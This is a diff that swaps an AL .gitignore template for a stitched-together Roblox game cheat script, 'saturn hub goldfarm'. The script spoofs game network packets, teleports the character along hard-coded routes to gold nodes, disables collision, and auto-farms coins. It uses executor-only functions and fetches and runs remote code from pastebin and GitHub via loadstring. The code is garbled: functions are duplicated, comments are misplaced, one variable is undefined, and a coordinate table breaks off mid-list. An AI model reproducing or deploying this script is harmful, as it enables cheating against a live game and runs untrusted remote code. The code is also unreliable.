@@ -1,22 +1,1265 @@
-### AL ###
-#Template for AL projects for Dynamics 365 Business Central
-#launch.json folder
-.vscode/
-#Cache folder
-.alcache/
-#Symbols folder
-.alpackages/
-#Snapshots folder
-.snapshots/
-#Testing Output folder
-.output/
-#Extension App-file
-*.app
-#Rapid Application Development File
-rad.json
-#Translation Base-file
-*.g.xlf
-#License-file
-*.flf
-#Test results file
-TestResults.xml
+local local_Player = game:GetService("Players").LocalPlayer; local players = game:GetService("Players"); local plr = players.LocalPlayer; local mouse = plr:GetMouse(); local char = plr.Character; local root = char and char:FindFirstChild("HumanoidRootPart") or nil; local hum = char and char:FindFirstChild("Humanoid") or nil; plr.CharacterAdded:Connect(function() char = plr.Character; root = char:WaitForChild("HumanoidRootPart"); hum = char:WaitForChild("Humanoid") end); local rep = game:GetService("ReplicatedStorage"); local rs = game:GetService("RunService"); local input = game:GetService("UserInputService"); local keycodes = Enum.KeyCode:GetEnumItems(); local ts = game:GetService("TeleportService"); local cam = workspace.CurrentCamera; local isvoid = game.PlaceId == 11879754496; local offset = -1; local packets = not isvoid and require(rep.Modules.Packets) or {}; if isvoid then for i, v in pairs(rep:WaitForChild("Events"):GetChildren()) do if v:IsA("RemoteEvent") then packets[v.Name] = { send = function(...) v:FireServer(...) end } end end end; local bytenet = not isvoid and rep:FindFirstChild("ByteNetReliable") or nil; local packetsenumerated = {}; local c = 0; for i, v in pairs(packets) do c += 1; packetsenumerated[i] = c end; local itemids; local itemdata; for i, v in pairs(getreg()) do if type(v) == "table" then if not itemids and v[1] == "Wood" then itemids = v elseif not itemdata and type(v.Wood) == "table" and v.Wood.itemType then itemdata = v elseif itemids and itemdata then break end end end; local statsgui = plr.PlayerGui:WaitForChild("MainGui"):WaitForChild("Panels"):WaitForChild("Stats"); local inventorygui = plr.PlayerGui:WaitForChild("MainGui"):WaitForChild("RightPanel"):WaitForChild("Inventory"):WaitForChild("List"); local repo = 'https://raw.githubusercontent.com/violin-suzutsuki/LinoriaLib/main/'; local magicchars = "[%(%)%.%%%+%-%*%?%[%]%^%$]"; local function sanitize(str) return string.gsub(str, magicchars, function(s) return "%" .. s end) end; local uilib = loadstring(game:HttpGet("https://pastebin.com/raw/66XBAbBh"))(); local themelib = loadstring(game:HttpGet(repo .. 'addons/ThemeManager.lua'))(); local savelib = loadstring(game:HttpGet(repo .. 'addons/SaveManager.lua'))(); local Window = uilib:CreateWindow({ Title = "saturn hub goldfarm", Center = true, AutoShow = true, TabPadding = 8, MenuFadeTime = 0.2 }); Window.ScreenGui = "killmenow"; local veltoggle = Instance.new("BodyVelocity"); veltoggle.P = math.huge; veltoggle.Velocity = Vector3.new(); veltoggle.MaxForce = Vector3.new(math.huge, math.huge, math.huge); local isrunning = true; local unloads = {}; uilib:OnUnload(function() isrunning = false; for i, v in pairs(unloads) do task.spawn(v) end end); local function flatten(vec) return Vector3.new(vec.X, 0, vec.Z) end; local function remove(t1, find) if not table.find(t1, find) then return end return table.remove(t1, table.find(t1, find)) end; local function merge(t1, ...) for i, t2 in pairs({...}) do table.move(t2, 1, #t2, #t1 + 1, t1) end return t1 end; local function trim(str) local s, _ = string.gsub(str, '^%s*(.-)%s*$', '%1') return s end; local function truelen(t) local c = 0; for _, _ in pairs(t) do c += 1 end return c end; local function getServers(id) return game:GetService("HttpService"):JSONDecode(request({Url = `https://games.roblox.com/v1/games/{id}/servers/0?sortOrder=2&excludeFullGames=true&limit=100`}).Body) end; local function getMover(part) for i, v in pairs(part:GetDescendants()) do if not v:IsA("BasePart") then continue end local ocf = v.CFrame v.CFrame = CFrame.new() if v.CFrame == CFrame.new() then v.CFrame = ocf return v end end end; local function getMovePart() if not root then return nil end if not (hum and root and hum.SeatPart and hum.SeatPart.Parent) then return root end return getMover(hum.SeatPart.Parent) or root end; local function getMovementRaycastParams() local rp = RaycastParams.new() rp.IgnoreWater = true; rp.FilterType = Enum.RaycastFilterType.Exclude; local filt = {workspace:FindFirstChild("Items"), hum and hum.SeatPart and hum.SeatPart.Parent, workspace:FindFirstChild("Critters")} for i, v in pairs(game:GetService("Players"):GetPlayers()) do table.insert(filt, v.Character) end for i, v in pairs(workspace:GetChildren()) do if v.Name == "RainPart" then table.insert(filt, v) end end rp.FilterDescendantsInstances = filt return rp end; local function moveTo(pos) if not getMovePart() then return end if typeof(pos) == "Vector3" then pos = CFrame.new(pos) end local move = getMovePart() if move == root then move.CFrame = pos else local dif = (move.CFrame.Position - root.CFrame.Position) move.CFrame = pos + dif end end; local newvels = {}; local ogvels = {}; local ogparts = {}; task.spawn(function() while isrunning do rs.PreSimulation:Wait() for i, v in pairs(newvels) do for i, v in pairs(v) do local mf = v.MaxForce v.Parent.Velocity = Vector3.new(mf.X == math.huge and 0 or v.Parent.Velocity.X, mf.Y == math.huge and 0 or v.Parent.Velocity.Y, mf.Z == math.huge and 0 or v.Parent.Velocity.Z) end end end end)
+local function disableBoat(name, vec) name = name or "Anonymous"; newvels[name] = newvels[name] or {}; ogvels[name] = ogvels[name] or {}; ogparts[name] = ogparts[name] or {}; if not getMovePart() then return end vec = vec or Vector3.new(1, 1, 1); local force = Vector3.new(if vec.X == 1 then math.huge else 0, if vec.Y == 1 then math.huge else 0, if vec.Z == 1 then math.huge else 0) for i, v in pairs(char:GetDescendants()) do if ogvels[name][v] or ogparts[name][v] then continue end if v ~= veltoggle and (v:IsA("BodyVelocity") or v:IsA("BodyPosition")) then ogvels[name][v] = v.MaxForce; v.MaxForce = Vector3.new() elseif v:IsA("BasePart") then ogparts[name][v] = {v.CanCollide, v.Massless}; v.CanCollide = false; v.Massless = true; local newveltoggle = veltoggle:Clone(); newveltoggle.Parent = v; newveltoggle.MaxForce = force; table.insert(newvels[name], newveltoggle) end end for i, v in pairs(hum and hum.SeatPart and hum.SeatPart.Parent and hum.SeatPart.Parent:GetDescendants() or {}) do if ogvels[name][v] or ogparts[name][v] then continue end if v ~= veltoggle and (v:IsA("BodyVelocity") or v:IsA("BodyPosition")) then ogvels[name][v] = v.MaxForce; v.MaxForce = Vector3.new() elseif v:IsA("BasePart") then ogparts[name][v] = {v.CanCollide, v.Massless}; v.CanCollide = false; v.Massless = true; local newveltoggle = veltoggle:Clone(); newveltoggle.Parent = v; newveltoggle.MaxForce = force; table.insert(newvels[name], newveltoggle) end end end; local function enableBoat(name) name = name or "Anonymous"; newvels[name] = newvels[name] or {}; ogvels[name] = ogvels[name] or {}; ogparts[name] = ogparts[name] or {}; for i, v in pairs(newvels[name]) do v:Destroy(); remove(newvels[name], v) end for i, v in pairs(char:GetDescendants()) do if v:IsA("BodyVelocity") then v:Destroy() end end for i, v in pairs(ogvels[name]) do remove(ogvels[name], v); i.MaxForce = v end for i, v:Instance in pairs(ogparts[name]) do remove(ogparts[name], v); i.CanCollide = v[1]; i.Massless = v[2] end newvels[name] = nil; ogvels[name] = nil; ogparts[name] = nil end; table.insert(unloads, function() for i, v in pairs(newvels) do enableBoat(i) end end)
+
+--math.huge else 0
+
+local function teleportStepToward(pos,rate,step,height) if not root then return end local posflat=flatten(pos) local cposflat=flatten(root.Position) local dir = (posflat-cposflat).Unit local dist = (posflat-cposflat).Magnitude if dir.X~=dir.X then dir=Vector3.new() end cposflat+=dir*math.clamp((step or rs.PreSimulation:Wait())*rate,0,dist) local ray = workspace:Raycast(cposflat+Vector3.new(0,root.Position.Y+25,0),Vector3.new(0,-10000,0),getMovementRaycastParams()) if ray then moveTo(ray.Position+Vector3.new(0,height or 3.5,0)) end end local function teleportTo(pos:Vector3,rate:number,reenable:boolean,validator:()->boolean,height) local posflat=flatten(pos) local cposflat=flatten(root.Position) local dir = (posflat-cposflat).Unit local tptoken = game:GetService("HttpService"):GenerateGUID(false) disableBoat("Teleport"..tptoken) while getMovePart() and validator() do local step = rate*rs.PreSimulation:Wait() if (cposflat-posflat).Magnitude<step then moveTo(pos) break else cposflat+=dir*step local ray = workspace:Raycast(cposflat+Vector3.new(0,1000,0),Vector3.new(0,-2000,0),getMovementRaycastParams()) if ray then moveTo(ray.Position+Vector3.new(0,height or 5,0)) end end end enableBoat("Teleport"..tptoken) end local function getSlot(name) if inventorygui:FindFirstChild(name) and not inventorygui[name]:IsA("UILayout") then return inventorygui[name].LayoutOrder end end local function getCount(name) if inventorygui:FindFirstChild(name) and not inventorygui[name]:IsA("UILayout") and inventorygui[name]:FindFirstChild("QuantityText",true) then return tonumber(inventorygui[name]:FindFirstChild("QuantityText",true).Text) or 0 end return 0 end local function getItemId(name) return itemids[name] end local function teamcheck(plr2) return (plr.Neutral or plr.Team.Name=="NoTribe" or plr.Team~=plr2.Team) end local function hit(parts) local new = {} for _,v in next, parts do local item = v if v:IsA("BasePart") then item = v:GetAttribute("EntityID") end table.insert(new, item) end packets.SwingTool.send(new) end local function useSlot(slot) packets.UseBagItem.send(slot) end local pickupbuf = buffer.create(2) buffer.writeu8(pickupbuf,0,packetsenumerated.Pickup) buffer.writeu8(pickupbuf,1,1) local grabbed = {} local function isGrabbed(c) return grabbed[c]==true end local function pickup(part) if isGrabbed(part) then return end if isvoid or not optimize then packets.Pickup.send(part:GetAttribute("EntityID")) else bytenet:FireServer(pickupbuf,{part:GetAttribute("EntityID")}) end task.spawn(function() grabbed[part]=true task.wait(plr:GetNetworkPing()+1) grabbed[part]=nil end) end local function plant(box,plant) if not isvoid then packets.InteractStructure.send({entityID=box:GetAttribute("EntityID"),itemID=plant}) else packets.InteractStructure.send(box,plant) end end local function grab(item) packets.ForceInteract.send(item:GetAttribute("EntityID")) end local function manipulate(item,func) grab(item) rs.PreSimulation:Wait() func(item) grab() end local function craft(item) packets.CraftItem.send(item) end local function touch(p1,p2) firetouchinterest(p1,p2,1) firetouchinterest(p1,p2,0) end local function place(name,rot,pos) if not isvoid then packets.PlaceStructure.send({ buildingName=name, yrot=rot, vec=pos, isMobile=false, }) else packets.PlaceStructure.send( pos, name, rot, false ) end end local pressbuf = buffer.create(4) buffer.writeu8(pressbuf,0,packetsenumerated.InteractStructure) buffer.writeu8(pressbuf,1,1) buffer.writeu16(pressbuf,2,if not isvoid then getItemId("Gold") else 0) local function press(press) if isvoid then return plant(press,"Gold") end if not optimize then return plant(press:GetAttribute("EntityID"),getItemId("Gold")) end bytenet:FireServer(pressbuf,{press:GetAttribute("EntityID")}) end local combat = Window:AddTab("Goldfarm") local uisettings = Window:AddTab("UI Settings") local menu = uisettings:AddLeftGroupbox('Menu') menu:AddButton('Unload', function() uilib:Unload() end) menu:AddLabel('Menu bind'):AddKeyPicker('MenuKeybind', { Default = 'RShift', NoUI = true, Text = 'Menu keybind' }) themelib:SetLibrary(uilib) themelib:ApplyToTab(uisettings) local birds = {} if game.ReplicatedFirst:FindFirstChild("Animals") then for i,v:Instance in pairs(workspace.Critters:GetChildren()) do if v.Name=="Bird" then table.insert(birds,v) local con con = v.AncestryChanged:Connect(function(c,p) if p==nil then remove(birds,v) con:Disconnect() end end) end end workspace.Critters.ChildAdded:Connect(function(v:Instance) if v.Name=="Bird" and not table.find(birds,v) then table.insert(birds,v) local con con = v.AncestryChanged:Connect(function(c,p) if p==nil then remove(birds,v) con:Disconnect() end end) end end) end local resources = {} local function addResource(v:Instance) if v:IsA("Model") then table.insert(resources,v) local gone = false v.AncestryChanged:Connect(function(c,p) if p==nil and not gone then gone=true remove(resources,v) end end) if v:FindFirstChild("Breakaway") then for i,v in pairs(v.Breakaway:GetChildren()) do addResource(v) end end end end for i,v:Instance in pairs(workspace.Resources:GetChildren()) do addResource(v) end workspace.Resources.ChildAdded:Connect(addResource) 
+
+
+
+
+
+
+local Players = cloneref(game:GetService("Players"))
+local LocalPlayer = Players.LocalPlayer
+local Mouse = LocalPlayer:GetMouse()
+local RunService = cloneref(game:GetService('RunService'))
+local Workspace = cloneref(game:GetService("Workspace"))
+local ReplicatedStorage = cloneref(game:GetService("ReplicatedStorage"))
+
+local Packets = require(ReplicatedStorage.Modules.Packets)
+local PlaceID = game.placeId
+local StorageFolder = {}
+local ItemStorage = {}
+
+local ReplicateAnimation, Animation = Instance.new('Animation'), nil
+ReplicateAnimation.AnimationId = "rbxassetid://10761451679"
+
+local function CheckPlayer()
+    local Character = LocalPlayer.Character
+    return Character and Character:FindFirstChild("HumanoidRootPart") and Character:FindFirstChild("Humanoid").Health > 0
+end
+
+local function CheckTool()
+    for i,v in next, LocalPlayer.Character:GetDescendants() do
+        local lower = v.Name:lower()
+        if lower:find("axe") or lower:find("pick") or lower:find("rock") then
+            return true
+        end
+    end
+    return false
+end
+
+--shark
+
+local function GetEntityID(model)
+    return model:GetAttribute("EntityID")
+end
+
+local function GetClosestItem()
+    local Closest
+
+    -- Iterate through Workspace.Resources
+    for i, v in pairs(Workspace.Resources:GetChildren()) do
+        if v.Name and v:IsA("Model") then
+            if v.PrimaryPart ~= nil then
+                local Distance = (LocalPlayer.Character.HumanoidRootPart.Position - v.PrimaryPart.Position).Magnitude
+                if Distance <= 9 then
+                    Closest = v.PrimaryPart
+                end
+            end
+        elseif v.Name and v:IsA("BasePart") then
+            local Distance = (LocalPlayer.Character.HumanoidRootPart.Position - v.Position).Magnitude
+            if Distance <= 9 then
+                Closest = v
+            end
+        elseif v.Name and v:IsA("Model") and string.find(v.Name:lower(), "tree") then
+            if v.PrimaryPart ~= nil then
+                local Distance = (LocalPlayer.Character.HumanoidRootPart.Position - v.PrimaryPart.Position).Magnitude
+                if Distance <= 13 then
+                    Closest = v.PrimaryPart
+                end
+            end
+        elseif v.Name and v:IsA("Model") and string.find(v.Name:lower(), "god") then
+            local Totem = v:FindFirstChild("Totem")
+            if Totem ~= nil then
+                local Distance = (LocalPlayer.Character.HumanoidRootPart.Position - Totem.Position).Magnitude
+                if Distance <= 25 then
+                    Closest = Totem
+                end
+            end
+        end
+    end
+
+    -- Iterate through Workspace
+    for i, v in pairs(Workspace:GetChildren()) do
+        if v:IsA("Model") and (string.find(v.Name:lower(), 'core') or string.find(v.Name:lower(), 'ice') or string.find(v.Name:lower(), 'rock') or v.Name:lower():find("node")) then
+            if v.PrimaryPart ~= nil then
+                local Distance = (LocalPlayer.Character.HumanoidRootPart.Position - v.PrimaryPart.Position).Magnitude
+                if Distance <= 9 then
+                    Closest = v.PrimaryPart
+                end
+            end
+        end
+    end
+    
+    return Closest
+end
+
+--chest
+local vels = {}
+local parts = {}
+local function disableBoat1()
+	if not getMovePart() then return end
+	for i,v in pairs(getMovePart().Parent:GetDescendants()) do
+		if v~=veltoggle and (v:IsA("BodyVelocity") or v:IsA("BodyPosition")) then
+			vels[v]=v.MaxForce
+			v.MaxForce=Vector3.new()
+		elseif v:IsA("BasePart") then
+			table.insert(parts,v)
+			v.CanCollide=false
+			v.Massless=true
+		end
+	end
+	veltoggle.Parent=getMovePart()
+	veltoggle.MaxForce=Vector3.new(math.huge,math.huge,math.huge)
+end
+local function enableBoat1()
+	for i,v in pairs(vels) do
+		i.MaxForce=v
+	end
+	for i,v in pairs(parts) do
+		v.CanCollide=true
+		v.Massless=false
+	end
+	table.clear(vels)
+	table.clear(parts)
+	veltoggle.Parent=nil
+end
+local function teleportStepToward(pos,rate,step,height)
+	local posflat=Vector3.new(pos.X,0,pos.Z)
+	local cposflat=Vector3.new(root.CFrame.Position.X,0,root.CFrame.Position.Z)
+	local dir = (posflat-cposflat).Unit
+	local dist = (posflat-cposflat).Magnitude
+	if dir.X~=dir.X then
+		dir=Vector3.new()
+	end
+	cposflat+=dir*math.clamp((step or rs.PreSimulation:Wait())*rate,0,dist)
+	local ray = workspace:Raycast(cposflat+Vector3.new(0,getMovePart().Position.Y+25,0),Vector3.new(0,-10000,0),getMovementRaycastParams())
+	if ray then
+		moveTo(ray.Position+Vector3.new(0,height or 3.5,0))
+	end
+end
+local function teleportTo(pos:Vector3,rate:number,reenable:boolean,validator:()->boolean,height)
+	local posflat=Vector3.new(pos.X,0,pos.Z)
+	local cposflat=Vector3.new(root.CFrame.Position.X,0,root.CFrame.Position.Z)
+	local dir = (posflat-cposflat).Unit
+
+	disableBoat1()
+	while getMovePart() and validator() do
+		local step = rate*rs.PreSimulation:Wait()
+		if (cposflat-posflat).Magnitude<step then
+			moveTo(pos)
+			break
+		else
+			cposflat+=dir*step
+			local ray = workspace:Raycast(cposflat+Vector3.new(0,1000,0),Vector3.new(0,-2000,0),getMovementRaycastParams())
+			if ray then
+				moveTo(ray.Position+Vector3.new(0,height or 5,0))
+			end
+		end
+	end
+	if reenable==nil or reenable then
+		enableBoat1()
+	end
+end
+
+
+local TweenService = game:GetService("TweenService")
+local Players = game:GetService("Players")
+
+local player = Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+
+local speed = 24 
+local waitTimes = {1.6, 1.6, 1.6, 1.6, 159} 
+local currentIndex = 1
+local walking = false
+local moving = false
+local chestModel = nil
+local distanceUntilTween = 5 
+local distanceInFrontOfChest = 5 
+local offsetAngle = math.rad(-90) 
+
+local function findChestModel()
+    for _, v in ipairs(game.Workspace:GetDescendants()) do
+        if v.Name == "Chest" and v:IsA("Model") then
+            chestModel = v
+            break
+        end
+    end
+end
+--auto eat
+local function walkTo(position)
+    if not humanoidRootPart or not chestModel then
+        return
+    end
+
+    moving = true
+
+    local distance = (position - humanoidRootPart.Position).Magnitude
+    local time = distance / speed
+
+    local tweenInfo = TweenInfo.new(time, Enum.EasingStyle.Linear)
+
+    local tween = TweenService:Create(humanoidRootPart, tweenInfo, {CFrame = CFrame.new(position)})
+    tween:Play()
+
+    tween.Completed:Wait()
+
+    moving = false
+
+    local waitTime = waitTimes[currentIndex]
+    wait(waitTime)
+
+    currentIndex = (currentIndex % #waitTimes) + 1
+end
+
+local function startWalking()
+    walking = true
+    spawn(function()
+        while walking do
+            local positionsToTween = {
+                CFrame.new(912.9915771484375, 1.0513689517974854, -1418.68505859375),
+                CFrame.new(945.1878662109375, 1.049041509628296, -1433.4344482421875),
+                CFrame.new(964.83984375, 0.9180158376693726, -1390.8240966796875),
+                CFrame.new(919.7612915039062, 0.8762727975845337, -1386.2818603515625)
+                        }
+
+            for _, position in ipairs(positionsToTween) do
+                walkTo(position.Position)
+            end
+
+            if chestModel then
+                local chestCFrame = chestModel.PrimaryPart.CFrame
+                local offsetVector = chestCFrame.LookVector * distanceInFrontOfChest
+                local rotationOffset = CFrame.Angles(0, offsetAngle, 0)
+                local chestPosition = chestCFrame.Position + rotationOffset:VectorToWorldSpace(offsetVector)
+                walkTo(chestPosition)
+            end
+
+            wait(1) -- Wait for a moment before restarting the sequence
+        end
+    end)
+end
+
+local function stopWalking()
+    walking = false
+end
+
+local function toggleWalking(enabled)
+    if enabled then
+        findChestModel()
+        startWalking()
+    else
+        stopWalking()
+    end
+end
+--presses coins
+
+local Farming = combat:AddGroupbox({Name="make sure to place chest",Side=1})
+
+
+
+Farming:AddToggle('MyToggle', {
+	Text = 'afk coin farm ice',
+	Default = false,
+	Tooltip = 'Toggle to enable auto gold farm',
+	Callback = function(enabled)
+        if enabled then
+            findChestModel()
+            startWalking()
+        else
+            stopWalking()
+        end
+    end
+})
+
+Farming:AddSlider('WaitTimeSlider', {
+    Text = 'distance untill tween',
+    Default = 7,
+    Min = 0,
+    Max = 20,
+    Rounding = 1,
+    Compact = false,
+    Callback =function(value)
+        distanceUntilTween = value
+    end
+})
+--auto mine
+Farming:AddSlider('WaitTimeSlider', {
+    Text = 'dist infront of chest',
+    Default = 5,
+    Min = 0,
+    Max = 15,
+    Rounding = 1,
+    Compact = false,
+    Callback =function(value)
+        distanceInFrontOfChest = value
+    end
+})
+
+Farming:AddSlider('WaitTimeSlider', {
+    Text = 'speed',
+    Default = 15,
+    Min = 0,
+    Max = 30,
+    Rounding = 1,
+    Compact = false,
+    Callback =function(value)
+        speed = value
+    end
+})
+
+--hipheight
+
+local TweenService = game:GetService("TweenService")
+local speed = 23 -- Initial speed in studs per second                                 18                      26          29  30                       33                                                     56 64          53
+local waitTimes = {1.8, 1.8, 1.8, 1.8, 0, 0, 0, 0, 0, 0, 0, 0, 1.8, 0, 0, 0, 0, 1.8, 1.8, 1.8, 1.8, 0, 0, 0, 0, 0, 0, 1.8, 0, 1.8, 1.8, 0, 0, 0, 0, 0, 0, 0, 1.8, 0, 0, 0, 0, 1.8, 0, 0, 0, 1.8, 0, 0, 0, 0, 1.8, 0, 0, 0, 0, 1.8, 1.8, 0, 0, 0, 0, 0, 1.8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1.8, 1.8, 1.8, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1.8, 1.8, 1.8, 1.8, 0, 0, 0, 0, 1.8, 0, 1.8, 0, 0, 0, 0, 0, 0, 1.8, 0, 1.8, 0, 0, 1.8, 0, 0, 1.8, 0, 1.6, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0} -- Array of wait times corresponding to each tween
+local targetPositions = {
+	-- Spawn at ice nodes (4)
+	-- 4 Gold Nodes
+	CFrame.new(Vector3.new(915.2814331054688, -2.5274174213409424, -1385.6158447265625)), -- 4 Gold Nodes Bottom left
+	CFrame.new(Vector3.new(912.7943115234375, -1.6242637634277344, -1413.04833984375)), -- Bottom right
+	CFrame.new(Vector3.new(944.5631103515625, -1.5960471630096436, -1428.4208984375)), -- Top Left Node
+	CFrame.new(Vector3.new(958.9597778320312, -3.0000007152557373, -1391.968017578125)), -- Top Right
+	-- Going towards 4 nodes at mountain
+	CFrame.new(Vector3.new(893.2815551757812, -7.000373363494873, -969.5551147460938)), -- Adjusted to make it more direct
+	CFrame.new(Vector3.new(786.5398559570312, -3.0000007152557373, -718.9921875)),
+	CFrame.new(Vector3.new(641.176513671875, -3.855578899383545, -539.2426147460938)),
+	CFrame.new(Vector3.new(606.1619873046875, 32.754493713378906, -486.9465026855469)),
+	CFrame.new(Vector3.new(629.888427734375, 51.95648193359375, -433.0956115722656)),
+	CFrame.new(Vector3.new(642.2515258789062, 55.56715393066406, -418.8298645019531)),
+	CFrame.new(Vector3.new(650.3762817382812, 66.8869857788086, -409.7201843261719)),
+	CFrame.new(Vector3.new(666.4571533203125, 81.0921859741211, -393.62176513671875)),
+	-- Single node on mountain
+	CFrame.new(Vector3.new(688.4791870117188, 87.61669921875, -394.652099609375)), -- Node on top of mountain
+	-- Going to the 4 nodes in the mountain
+	CFrame.new(Vector3.new(666.319091796875, 70.99797058105469, -370.13189697265625)),
+	CFrame.new(Vector3.new(642.205810546875, 53.215579986572266, -367.0735168457031)),
+	CFrame.new(Vector3.new(606.570556640625, 28.03556251525879, -357.19976806640625)),
+	CFrame.new(Vector3.new(583.2708129882812, 14.1685791015625, -349.2284851074219)),
+	-- Start of the 4 nodes at the mountain
+	CFrame.new(Vector3.new(608.3096923828125, -5.825555324554443, -352.3447265625)), -- First Node -- Bottom right
+	CFrame.new(Vector3.new(622.8633422851562, -4.749398231506348, -357.05206298828125)), -- Second node -- Top right
+	CFrame.new(Vector3.new(638.2216796875, -1.9700599908828735, -381.2216491699219)), -- Top left gold node
+	CFrame.new(Vector3.new(613.03955078125, -3.3478689193725586, -387.1720886230469)), -- Bottom left gold node -- 21
+	-- Going out of the 4 gold node mountain
+	CFrame.new(Vector3.new(552.1689453125, 10.88880729675293, -391.5129699707031)), -- outside the enterence
+	CFrame.new(Vector3.new(510.2638854980469, -3.4913477897644043, -389.0484924316406)), -- Onto the ground
+	--Heading towards the 3 gold nodes near water fall
+	CFrame.new(Vector3.new(206.7015380859375, -3, -392.4203796386719)), 
+	CFrame.new(Vector3.new(125.72357177734375, -3, -367.7125244140625)),
+	CFrame.new(Vector3.new(11.849638938903809, -3, -273.90325927734375)),
+	CFrame.new(Vector3.new(-104.69710540771484, -3.0002832412719727, -224.1416015625)),
+	-- 3 Gold Nodes near waterfall
+	CFrame.new(Vector3.new(-127.7438735961914, -7.123413562774658, -203.4132843017578)), -- Top Gold node
+	CFrame.new(Vector3.new(-119.87413024902344, -25.971975326538086, -193.47650146484375)), -- Tps down to the second highest gold node at a safe spot
+	CFrame.new(Vector3.new(-109.06890869140625, -23.964372634887695, -187.114501953125)), -- Tps to the second highest gold node to break it
+	CFrame.new(Vector3.new(-146.6690216064453, -29.13951873779297, -166.2297821044922)), -- Third gold node at the bottom -- 31
+	-- Goes down into the underground
+	CFrame.new(Vector3.new(-78.91585540771484, -35.0000114440918, -114.45983123779297)), -- Tps to the ground
+	CFrame.new(Vector3.new(-57.03752136230469, -35.27948760986328, -104.7385025024414)), -- At the enterence of the underground
+	CFrame.new(Vector3.new(24.822755813598633, -35.0000114440918, -61.54426574707031)), -- Near the turning left
+	CFrame.new(Vector3.new(70.70474243164062, -45.68882369995117, -41.72166061401367)), -- At the end wall near the turning left
+	CFrame.new(Vector3.new(78.14912414550781, -72.6690902709961, -119.64269256591797)), -- near the bottom
+	CFrame.new(Vector3.new(76.23568725585938, -75.1935043334961, -143.13555908203125)),
+	CFrame.new(Vector3.new(26.672353744506836, -75.03893280029297, -112.16252899169922)),
+	-- 1 Gold node near enterence of the cave
+	CFrame.new(Vector3.new(6.2319817543029785, -79.60725402832031, -80.90323638916016)), -- Gold node
+	-- Going to other nodes
+	CFrame.new(Vector3.new(-3.0255465507507324, -83.4150619506836, -161.24505615234375)), 
+	CFrame.new(Vector3.new(-46.13719177246094, -84.78394317626953, -210.84336853027344)),
+	CFrame.new(Vector3.new(-171.44276428222656, -87.3593978881836, -258.4068603515625)),
+	CFrame.new(Vector3.new(-230.35887145996094, -83.01371765136719, -254.90994262695312)),
+	-- 1 Gold node near water
+	CFrame.new(Vector3.new(-248.11705017089844, -82.01800537109375, -242.68406677246094)),
+	-- Going to more nodes
+	CFrame.new(Vector3.new(-235.50645446777344, -95.69903564453125, -205.97381591796875)),
+	CFrame.new(Vector3.new(-201.13409423828125, -95.00701141357422, -100.48636627197266)),
+	CFrame.new(Vector3.new(-51.05535125732422, -95.09739685058594, -16.503742218017578)),
+	-- 1 Node
+	CFrame.new(Vector3.new(-18.18035316467285, -88.2457275390625, -4.662241458892822)), -- On top of the node
+	-- Going back for more nodes
+	CFrame.new(Vector3.new(-121.60362243652344, -95.46952819824219, -44.21466064453125)),
+	CFrame.new(Vector3.new(-226.48095703125, -95.75582122802734, -137.62271118164062)), -- 50
+	CFrame.new(Vector3.new(-311.2962341308594, -95.0000228881836, -62.702903747558594)),
+	CFrame.new(Vector3.new(-330.52532958984375, -91.57213592529297, -51.29126739501953)),
+	-- 1 node
+	CFrame.new(Vector3.new(-337.6909484863281, -87.902587890625, -44.36483383178711)), -- On top of node -- 53
+	-- Going away
+	CFrame.new(Vector3.new(-328.63311767578125, -91.01595306396484, -75.27430725097656)), -- 54
+	CFrame.new(Vector3.new(-320.9810791015625, -84.55455017089844, -112.79277038574219)),
+	CFrame.new(Vector3.new(-311.7552185058594, -80.34954071044922, -111.021240234375)),
+	CFrame.new(Vector3.new(-287.1490173339844, -71.30132293701172, -90.15459442138672)),
+	-- 2 Nodes
+	CFrame.new(Vector3.new(-242.28013610839844, -69.51567077636719, -70.7128677368164)),
+	CFrame.new(Vector3.new(-236.10598754882812, -71.55790710449219, -82.93661499023438)),
+	-- Going away
+	CFrame.new(Vector3.new(-262.2549743652344, -71.92373657226562, -78.05333709716797)),
+	CFrame.new(Vector3.new(-281.7058410644531, -95.24771881103516, -62.516048431396484)),
+	CFrame.new(Vector3.new(-204.44337463378906, -95.3782730102539, -215.5300750732422)),
+	CFrame.new(Vector3.new(-191.27264404296875, -87.3593978881836, -241.33700561523438)),
+	CFrame.new(Vector3.new(-227.31439208984375, -82.79011535644531, -262.97674560546875)),
+	-- 1 Node
+	CFrame.new(Vector3.new(-300.4206237792969, -78.71428680419922, -370.5965576171875)),  -- NEW ONE
+	-- Going away
+	CFrame.new(Vector3.new(-248.25885009765625, -78.9493408203125, -325.4560241699219)),
+	CFrame.new(Vector3.new(-201.70730590820312, -71.25202941894531, -387.3911437988281)),
+	CFrame.new(Vector3.new(-192.30209350585938, -67.08699035644531, -418.3362731933594)),
+	CFrame.new(Vector3.new(-177.47344970703125, -66.61293029785156, -420.8051452636719)),
+	CFrame.new(Vector3.new(-168.78817749023438, -73.24115753173828, -420.8697204589844)),
+	CFrame.new(Vector3.new(-147.6465301513672, -103.0000228881836, -420.92999267578125)),
+	CFrame.new(Vector3.new(-126.42853546142578, -103.0000228881836, -417.2859191894531)),
+	CFrame.new(Vector3.new(15.329987525939941, -101.69576263427734, -415.40478515625)),
+	CFrame.new(Vector3.new(20.97073745727539, -98.90089416503906, -390.7903137207031)),
+	-- 3 Gold nodes
+	CFrame.new(Vector3.new(21.28833770751953, -99.0000228881836, -376.1058044433594)), -- Front gold node
+	CFrame.new(Vector3.new(53.055545806884766, -99.05322265625, -355.8440246582031)), -- Far away gold node
+	CFrame.new(Vector3.new(39.688743591308594, -99.01302337646484, -368.5171203613281)), -- Middle Gold node
+	-- Going away
+	CFrame.new(Vector3.new(21.980361938476562, -98.79778289794922, -389.5634460449219)),
+	CFrame.new(Vector3.new(11.502516746520996, -103.0000228881836, -422.4435119628906)),
+	CFrame.new(Vector3.new(-35.83039093017578, -103.0000228881836, -400.1163024902344)),
+	CFrame.new(Vector3.new(-106.4627456665039, -103.0000228881836, -346.4954833984375)),
+	CFrame.new(Vector3.new(-109.88388061523438, -89.20711517333984, -270.5399475097656)),
+	CFrame.new(Vector3.new(-89.2496566772461, -87.23206329345703, -219.29232788085938)),
+	CFrame.new(Vector3.new(-39.856876373291016, -83.04651641845703, -209.97061157226562)),
+	CFrame.new(Vector3.new(7.984494686126709, -83.09564971923828, -155.0764617919922)),
+	CFrame.new(Vector3.new(50.02766418457031, -75.1011734008789, -141.13885498046875)),
